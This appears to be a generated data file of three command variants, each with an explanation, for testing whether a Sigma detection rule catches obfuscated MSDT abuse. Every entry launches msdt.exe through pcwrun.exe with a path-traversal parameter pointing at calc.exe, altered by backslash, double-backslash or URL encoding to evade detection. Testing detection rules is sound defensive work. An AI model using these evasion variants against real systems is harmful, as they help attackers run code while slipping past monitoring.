@@ -1,0 +1,14 @@
+[
+  {
+    "output": "pcwrun.exe msdt.exe /id PCWDiagnostic /skip true /param \"IT_BrowseForFile=..\\..\\..\\Windows\\System32\\calc.exe\"",
+    "explanation": "This command uses backslashes instead of forward slashes in the path traversal, which is a valid mutation technique for testing bypasses while remaining functionally equivalent."
+  },
+  {
+    "output": "pcwrun.exe msdt.exe /id PCWDiagnostic /skip true /param \"IT_BrowseForFile=..\\\\..\\\\..\\\\Windows\\\\System32\\\\calc.exe\"",
+    "explanation": "This command uses double backslashes for escaping and path traversal, which is a safe mutation technique that maintains the original intent while testing for bypass potential."
+  },
+  {
+    "output": "pcwrun.exe msdt.exe /id PCWDiagnostic /skip true /param \"IT_BrowseForFile=..%2F..%2F..%2FWINDOWS%2Fsystem32%2Fcalc.exe\"",
+    "explanation": "This command uses URL encoding for path traversal, which is a safe mutation technique for testing bypasses while staying within the scope of the Sigma rule."
+  }
+]
